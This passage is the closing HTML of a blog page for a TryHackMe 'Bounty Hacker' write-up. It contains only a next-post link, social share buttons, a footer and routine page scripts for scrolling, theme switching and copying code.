<a class=next href=https://umar0x01.sh/post/internal-thm/><span class=title>Next Page ¬ª</span><br><span>TryHackMe - Internal</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Bounty Hacker on twitter" href="https://twitter.com/intent/tweet/?text=TryHackMe%20-%20Bounty%20Hacker&url=https%3a%2f%2fumar0x01.sh%2fpost%2fbounty-hacker-thm%2f&hashtags=tryhackme%2cnmap%2cftp%2cssh%2chttp%2cgobuster%2ccewl%2chydra%2cbruteforcing%2cprivesc"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Bounty Hacker on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fumar0x01.sh%2fpost%2fbounty-hacker-thm%2f&title=TryHackMe%20-%20Bounty%20Hacker&summary=TryHackMe%20-%20Bounty%20Hacker&source=https%3a%2f%2fumar0x01.sh%2fpost%2fbounty-hacker-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Bounty Hacker on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fumar0x01.sh%2fpost%2fbounty-hacker-thm%2f&title=TryHackMe%20-%20Bounty%20Hacker"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Bounty Hacker on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fumar0x01.sh%2fpost%2fbounty-hacker-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Bounty Hacker on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20-%20Bounty%20Hacker%20-%20https%3a%2f%2fumar0x01.sh%2fpost%2fbounty-hacker-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Bounty Hacker on telegram" href="https://telegram.me/share/url?text=TryHackMe%20-%20Bounty%20Hacker&url=https%3a%2f%2fumar0x01.sh%2fpost%2fbounty-hacker-thm%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://twitter.com/syed__umar target=_blank>@syed__umar</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script><script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script></body></html>